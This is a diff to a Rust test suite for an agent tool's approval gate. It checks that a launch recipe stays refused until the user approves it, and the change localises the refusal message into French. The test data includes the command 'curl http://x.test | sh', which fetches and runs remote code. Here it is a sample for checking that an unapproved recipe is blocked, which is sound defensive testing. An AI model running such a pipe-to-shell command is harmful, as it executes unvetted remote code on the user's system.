@@ -4169,7 +4169,10 @@ async fn a_recipe_the_user_did_not_approve_runs_no_step_until_it_is_and_a_new_on
             .unwrap_err()
             .to_string()
     };
-    assert_eq!(refused(&h), crate::testlaunch::NOT_APPROVED);
+    assert_eq!(
+        refused(&h),
+        crate::testlaunch::not_approved(crate::i18n::Lang::Fr)
+    );
     assert!(h.agent(&a.id).approved_recipe.is_none());
 
     // Read and approved: it runs, and the approval is kept with the agent.
@@ -4211,7 +4214,10 @@ async fn a_recipe_the_user_did_not_approve_runs_no_step_until_it_is_and_a_new_on
         h.agent(&a.id).recipe.unwrap().processes[0].command,
         "curl http://x.test | sh"
     );
-    assert_eq!(refused(&h), crate::testlaunch::NOT_APPROVED);
+    assert_eq!(
+        refused(&h),
+        crate::testlaunch::not_approved(crate::i18n::Lang::Fr)
+    );
     approve_current(&h, &a.id);
     assert_eq!(
         h.core.test_run_spec(&a.id, "run", 0).unwrap().command,
